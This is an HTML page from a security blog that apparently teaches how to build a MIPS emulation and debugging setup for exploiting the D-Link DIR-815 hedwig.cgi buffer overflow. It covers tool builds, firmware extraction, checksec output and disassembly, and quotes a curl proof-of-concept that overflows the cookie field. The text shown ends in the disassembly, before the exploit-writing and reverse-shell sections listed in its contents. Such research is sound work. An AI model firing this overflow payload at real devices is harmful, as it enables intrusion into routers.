<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="Building MIPS Environment for Router &amp;&amp; PWN123456Tools for preparation#D-Link DIR-815 buffer overflow on  hedwig.cgi qemu User Mode&amp;&amp;官网固件 搭建调试环境qemu System Mode&amp;&amp;官网固件 MIPS虚拟机搭建">
<meta property="og:type" content="article">
<meta property="og:title" content="Building MIPS Environment for Router &amp;&amp; PWN">
<meta property="og:url" content="http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="Building MIPS Environment for Router &amp;&amp; PWN123456Tools for preparation#D-Link DIR-815 buffer overflow on  hedwig.cgi qemu User Mode&amp;&amp;官网固件 搭建调试环境qemu System Mode&amp;&amp;官网固件 MIPS虚拟机搭建">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-91d8bae3456a65af.gif?imageMogr2/auto-orient/strip">
<meta property="article:published_time" content="2019-02-23T10:08:07.000Z">
<meta property="article:modified_time" content="2019-02-24T12:36:56.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Router">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-91d8bae3456a65af.gif?imageMogr2/auto-orient/strip">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>Building MIPS Environment for Router &amp;&amp; PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/02/25/pwnable-tw-Tcache-Tear/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/02/22/Hgame-2019-PWN/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&text=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&is_video=false&description=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Building MIPS Environment for Router &amp;&amp; PWN&body=Check out this article: http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&name=Building MIPS Environment for Router &amp;&amp; PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Building-MIPS-Environment-for-Router-amp-amp-PWN"><span class="toc-number">1.</span> <span class="toc-text">Building MIPS Environment for Router &amp;&amp; PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-for-preparation"><span class="toc-number">1.1.</span> <span class="toc-text">Tools for preparation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Full-version-of-binwalk"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 Full version of binwalk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-QEMU"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x02 QEMU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-libguestfs"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x03 libguestfs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-MIPS-GCC"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x04 MIPS-GCC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-gdb-amp-amp-gdbserver"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x05 gdb&amp;&amp;gdbserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Some-Tools-for-IDA"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x06 Some Tools for IDA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Retdec"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">Retdec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIPS-ROP-Finder"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">MIPS ROP Finder</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-Environment-for-debug"><span class="toc-number">1.2.</span> <span class="toc-text">Building Environment for debug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-Get-the-binary"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">0x01 Get the binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-IDA静态分析"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">0x02 IDA静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-Debug-Environment-with-QEMU-User-Mode"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">0x03 Debug Environment with QEMU User Mode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-Web-Server-Build-with-QEMU-System-Mode"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">0x04 Web Server Build with QEMU System Mode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug-amp-amp-POC编写"><span class="toc-number">1.3.</span> <span class="toc-text">Debug &amp;&amp; POC编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-POC-amp-amp-反弹get-shell"><span class="toc-number">1.4.</span> <span class="toc-text">Run POC&amp;&amp;反弹get shell</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Building MIPS Environment for Router &amp;&amp; PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-02-23T10:08:07.000Z" itemprop="datePublished">2019-02-23</time>
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link" href="/tags/Router/" rel="tag">Router</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Building-MIPS-Environment-for-Router-amp-amp-PWN"><a href="#Building-MIPS-Environment-for-Router-amp-amp-PWN" class="headerlink" title="Building MIPS Environment for Router &amp;&amp; PWN"></a>Building MIPS Environment for Router &amp;&amp; PWN</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tools for preparation</span><br><span class="line">#D-Link DIR-815 buffer overflow on  hedwig.cgi </span><br><span class="line">qemu User Mode&amp;&amp;官网固件 搭建调试环境</span><br><span class="line">qemu System Mode&amp;&amp;官网固件 MIPS虚拟机搭建路由器Web服务</span><br><span class="line">debug&amp;&amp;POC编写</span><br><span class="line">run POC&amp;&amp;MIPS虚拟机Web服务下反弹get shell</span><br></pre></td></tr></table></figure>
<h2 id="Tools-for-preparation"><a href="#Tools-for-preparation" class="headerlink" title="Tools for preparation"></a>Tools for preparation</h2><h3 id="0x01-Full-version-of-binwalk"><a href="#0x01-Full-version-of-binwalk" class="headerlink" title="0x01 Full version of binwalk"></a>0x01 Full version of binwalk</h3><p><strong>To get the filesystem</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ReFirmLabs&#x2F;binwalk&#x2F;blob&#x2F;master&#x2F;INSTALL.md</span><br></pre></td></tr></table></figure>
<h3 id="0x02-QEMU"><a href="#0x02-QEMU" class="headerlink" title="0x02 QEMU"></a>0x02 QEMU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;git.qemu-project.org&#x2F;qemu.git</span><br><span class="line">#或者qemu官网下载特定版本源码</span><br><span class="line">sudo apt-get install libglib2.0 libglib2.0-dev</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">sudo .&#x2F;configure --static&amp;&amp;sudo make&amp;&amp;sudo make install</span><br><span class="line">#编译时间过长，可使用:</span><br><span class="line">#--target-list&#x3D;mipsel-softmmu,mipsel-linux-user</span><br><span class="line">#进行选择编译</span><br></pre></td></tr></table></figure>
<p>注意(针对此固件)：<br>版本过高：</p>
<ul>
<li>FPU MODE问题:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;patchwork.ozlabs.org&#x2F;patch&#x2F;989595&#x2F;</span><br></pre></td></tr></table></figure>
将最新更新的这地方patch掉就能正常使用</li>
<li>运行起来debug时ida容易跑飞</li>
</ul>
<p>版本过低：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid ELF image for this architecture</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在qemu&#x2F;linux-user&#x2F;elfload.c中patch为:</span><br><span class="line">static bool elf_check_ehdr(struct elfhdr *ehdr)</span><br><span class="line">&#123;</span><br><span class="line">    return (elf_check_arch(ehdr-&gt;e_machine)</span><br><span class="line">            &amp;&amp; ehdr-&gt;e_ehsize &#x3D;&#x3D; sizeof(struct elfhdr)</span><br><span class="line">            &amp;&amp; ehdr-&gt;e_phentsize &#x3D;&#x3D; sizeof(struct elf_phdr)</span><br><span class="line">           &#x2F;&#x2F; &amp;&amp; ehdr-&gt;e_shentsize &#x3D;&#x3D; sizeof(struct elf_shdr)  &#x2F;&#x2F;注释掉此行</span><br><span class="line">            &amp;&amp; (ehdr-&gt;e_type &#x3D;&#x3D; ET_EXEC || ehdr-&gt;e_type &#x3D;&#x3D; ET_DYN));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实测中2.5版本比较适用</strong></p>
<h3 id="0x03-libguestfs"><a href="#0x03-libguestfs" class="headerlink" title="0x03 libguestfs"></a>0x03 libguestfs</h3><p><strong>To mount qcow2:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>
<h3 id="0x04-MIPS-GCC"><a href="#0x04-MIPS-GCC" class="headerlink" title="0x04 MIPS-GCC"></a>0x04 MIPS-GCC</h3><p><strong>mips交叉编译环境搭建：</strong><br>openwrt或者buildroot:</p>
<ul>
<li>openwrt：<br>官网下载需要的toolchain(或者源码编译)而后配置编译环境即可<br>For example：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;downloads.openwrt.org&#x2F;barrier_breaker&#x2F;14.07&#x2F;ramips&#x2F;mt7620n&#x2F;OpenWrt-Toolchain-ramips-for-mipsel_24kec%2bdsp-gcc-4.8-linaro_uClibc-0.9.33.2.tar.bz2</span><br><span class="line">tar -jxvf OpenWrt-Toolchain-ramips-for-mipsel_24kec+dsp-gcc-4.8-linaro_uClibc-0.9.33.2.tar.bz2</span><br><span class="line">export STAGING_DIR&#x3D;~&#x2F;OpenWrt-Toolchain-ramips-for-mipsel_24kec+dsp-gcc-4.8-linaro_uClibc-0.9.33.2&#x2F;toolchain-mipsel_24kec+dsp_gcc-4.8-linaro_uClibc-0.9.33.2&#x2F;bin:$STAGING_DIR</span><br><span class="line">#而后使用STAGING_DIR下的mipsel-openwrt-linux-gcc编译即可，这个适用于刷入openwrt的系统</span><br></pre></td></tr></table></figure></li>
<li>buildroot：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;buildroot.uclibc.org&#x2F;downloads&#x2F;snapshots&#x2F;buildroot-snapshot.tar.bz2</span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br><span class="line">#配置上：</span><br><span class="line">Target Architecture:MIPS(little endian)</span><br><span class="line">Target Architecture Variant: mips32</span><br><span class="line">Toolchain-&gt;Kernel Headers：本机对应的内核版本</span><br><span class="line">#保存配置(可能需要下载依赖：sudo apt-get install libncurses5-dev  patch)</span><br><span class="line">sudo make</span><br></pre></td></tr></table></figure>
<h3 id="0x05-gdb-amp-amp-gdbserver"><a href="#0x05-gdb-amp-amp-gdbserver" class="headerlink" title="0x05 gdb&amp;&amp;gdbserver"></a>0x05 gdb&amp;&amp;gdbserver</h3>下载源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;gdb</span><br></pre></td></tr></table></figure>
gdb&amp;gdbserver:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-&gt;.&#x2F;</span><br><span class="line">gdbserver-&gt;.&#x2F;gdb&#x2F;gdbserver</span><br><span class="line"></span><br><span class="line">MIPS环境下：</span><br><span class="line">.&#x2F;configure --host&#x3D;mipsel-linux --target&#x3D;mipsel-linux --prefix&#x3D;......</span><br><span class="line">export CC&#x3D;......&#x2F;mipsel-linux-gcc #设置交叉编译环境</span><br><span class="line">生成Makefile后，将$(CC)改为$(CC) -static #静态编译，防止出现库问题</span><br><span class="line">#也可以在$(COMPILER)后添加 -static，能静态编译即可</span><br><span class="line"></span><br><span class="line">本机下：</span><br><span class="line">.&#x2F;configure --host&#x3D;(本机环境) --target&#x3D;mipsel-linux --prefix&#x3D;.....</span><br><span class="line"></span><br><span class="line">#会有一些报错，可以自己修改源码或者更换版本</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x06-Some-Tools-for-IDA"><a href="#0x06-Some-Tools-for-IDA" class="headerlink" title="0x06 Some Tools for IDA"></a>0x06 Some Tools for IDA</h3><h4 id="Retdec"><a href="#Retdec" class="headerlink" title="Retdec"></a>Retdec</h4><p><strong>IDA 7.0:</strong></p>
<ul>
<li>插件安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;avast-tl&#x2F;retdec-idaplugin&#x2F;</span><br><span class="line">#releases</span><br></pre></td></tr></table></figure></li>
<li>配置Retdec：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;avast-tl&#x2F;retdec&#x2F;</span><br><span class="line">#releases</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>3.2版本不需要其他依赖</strong><br><strong>在Options-&gt;Retdec plugin options配置好retdec-decompiler.py位置即可</strong></p>
<h4 id="MIPS-ROP-Finder"><a href="#MIPS-ROP-Finder" class="headerlink" title="MIPS ROP Finder"></a>MIPS ROP Finder</h4><p><strong>IDA 6.8:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;ida&#x2F;</span><br></pre></td></tr></table></figure>
<p>将：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;ida&#x2F;tree&#x2F;master&#x2F;plugins&#x2F;mipsrop</span><br></pre></td></tr></table></figure>
<p><strong>放入IDA_ROOT/plugins/下即可</strong></p>
<h2 id="Building-Environment-for-debug"><a href="#Building-Environment-for-debug" class="headerlink" title="Building Environment for debug"></a>Building Environment for debug</h2><h4 id="0x01-Get-the-binary"><a href="#0x01-Get-the-binary" class="headerlink" title="0x01 Get the binary"></a>0x01 Get the binary</h4><p>官网固件下载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;ftp2.dlink.com&#x2F;PRODUCTS&#x2F;DIR-815&#x2F;REVA&#x2F;DIR-815_FIRMWARE_1.01.ZIP</span><br></pre></td></tr></table></figure>
<p><strong>Get the filesystem:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e .&#x2F;DIR-815\ FW\ 1.01b14_1.01b14.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: &quot;dev&#x3D;&#x2F;dev&#x2F;mtdblock&#x2F;2&quot;</span><br><span class="line">108           0x6C            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3017436 bytes</span><br><span class="line">983148        0xF006C         PackImg section delimiter tag, little endian size: 14690816 bytes; big endian size: 2809856 bytes</span><br><span class="line">983180        0xF008C         Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2808054 bytes, 1526 inodes, blocksize: 262144 bytes, created: 2011-05-12 14:14:40</span><br></pre></td></tr></table></figure>
<p><strong>filesystem：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;router&#x2F;DIR-815&#x2F;squashfs-root$ ls</span><br><span class="line">bin  dev  etc  home  htdocs  lib  mnt  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure>
<p><strong>漏洞描述：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Buffer overflow on &quot;hedwig. cgi&quot;</span><br><span class="line"></span><br><span class="line">Another buffer overflow affects the&quot; hedwig. cgi&quot; CGI script. Unauthenticatedremote attackers can invoke this CGI with an overly-long cookie value thatcan overflow a program buffer and overwrite the saved program address.</span><br><span class="line"></span><br><span class="line">Proof-of -concept:</span><br><span class="line">      curl -b uid&#x3D;$(perl -e&#39; print &quot;A&#39; x1400:;&quot;)  -d  &#39; test&#39; http:&#x2F;&#x2F;&lt;target íp&gt;&#x2F;hedwig. cgi</span><br></pre></td></tr></table></figure>
<p><strong>hedwig.cgi:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;router&#x2F;DIR-815&#x2F;squashfs-root&#x2F;htdocs&#x2F;web$ ls -l|grep hedwig.cgi</span><br><span class="line">lrwxrwxrwx 1 kirin kirin   14 1月   6 23:35 hedwig.cgi -&gt; &#x2F;htdocs&#x2F;cgibin</span><br><span class="line"></span><br><span class="line">~&#x2F;router&#x2F;DIR-815&#x2F;squashfs-root&#x2F;htdocs$ checksec .&#x2F;cgibin </span><br><span class="line">[!] Could not populate PLT: Invalid memory write (UC_ERR_WRITE_UNMAPPED)</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;kirin&#x2F;router&#x2F;DIR-815&#x2F;squashfs-root&#x2F;htdocs&#x2F;cgibin&#39;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h4 id="0x02-IDA静态分析"><a href="#0x02-IDA静态分析" class="headerlink" title="0x02 IDA静态分析"></a>0x02 IDA静态分析</h4><p>大致分析漏洞点：<br>首先看到cgibin中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#main function:</span><br><span class="line">.text:004023E0                 lui     $gp, 0x43  # &#39;C&#39;</span><br><span class="line">.text:004023E4                 addiu   $sp, -0x30</span><br><span class="line">.text:004023E8                 li      $gp, 0x4346D0</span><br><span class="line">.text:004023EC                 sw      $ra, 0x30+var_4($sp)</span><br><span class="line">.text:004023F0                 sw      $s3, 0x30+var_8($sp)</span><br><span class="line">.text:004023F4                 sw      $s2, 0x30+var_C($sp)</span><br><span class="line">.text:004023F8                 sw      $s1, 0x30+var_10($sp)</span><br><span class="line">.text:004023FC                 sw      $s0, 0x30+var_14($sp)</span><br><span class="line">.text:00402400                 sw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:00402404                 lw      $s0, 0($a1)</span><br><span class="line">.text:00402408                 la      $t9, strrchr</span><br><span class="line">.text:0040240C                 move    $s2, $a1</span><br><span class="line">.text:00402410                 move    $s1, $a0</span><br><span class="line">.text:00402414                 li      $a1, 0x2F  # &#39;&#x2F;&#39;  # c</span><br><span class="line">.text:00402418                 move    $a0, $s0         # s</span><br><span class="line">.text:0040241C                 jalr    $t9 ; strrchr</span><br><span class="line">.text:00402420                 move    $s3, $a2</span><br><span class="line">.text:00402424                 lw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:00402428                 beqz    $v0, loc_402434</span><br><span class="line">.text:0040242C                 nop</span><br><span class="line">.text:00402430                 addiu   $s0, $v0, 1</span><br><span class="line">.text:00402434</span><br><span class="line">.text:00402434 loc_402434:                              # CODE XREF: main+48↑j</span><br><span class="line">.text:00402434                 la      $t9, strcmp</span><br><span class="line">.text:00402438                 la      $a1, aPhpcgi     # &quot;phpcgi&quot;</span><br><span class="line">.text:00402440                 jalr    $t9 ; strcmp</span><br><span class="line">.text:00402444                 move    $a0, $s0         # s1</span><br><span class="line">.text:00402448                 lw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:0040244C                 bnez    $v0, loc_402460</span><br><span class="line">.text:00402450                 lui     $a1, 0x42  # &#39;B&#39;</span><br><span class="line">.text:00402454                 la      $t9, phpcgi_main</span><br><span class="line">.text:00402458                 b       loc_40268C</span><br><span class="line">.text:0040245C                 move    $a0, $s1</span><br><span class="line">.text:00402460  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00402460</span><br><span class="line">.text:00402460 loc_402460:                              # CODE XREF: main+6C↑j</span><br><span class="line">.text:00402460                 la      $t9, strcmp</span><br><span class="line">.text:00402464                 addiu   $a1, (aDlcfg_cgi - 0x420000)  # &quot;dlcfg.cgi&quot;</span><br><span class="line">.text:00402468                 jalr    $t9 ; strcmp</span><br><span class="line">.text:0040246C                 move    $a0, $s0         # s1</span><br><span class="line">.text:00402470                 lw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:00402474                 bnez    $v0, loc_402488</span><br><span 